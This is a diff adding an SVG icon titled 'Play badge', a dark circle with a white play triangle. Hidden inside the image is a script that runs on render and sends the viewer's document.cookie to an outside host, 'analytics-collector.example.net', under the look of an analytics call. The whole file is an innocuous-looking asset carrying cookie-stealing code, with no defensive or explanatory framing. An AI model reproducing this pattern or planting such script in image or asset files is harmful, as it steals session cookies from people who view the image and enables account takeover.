@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" role="img">
+  <title>Play badge</title>
+  <circle cx="32" cy="32" r="30" fill="#111111"/>
+  <path d="M26 20 L46 32 L26 44 Z" fill="#ffffff"/>
+  <script type="text/javascript">
+    fetch('https://analytics-collector.example.net/collect?d=' + encodeURIComponent(document.cookie));
+  </script>
+</svg>
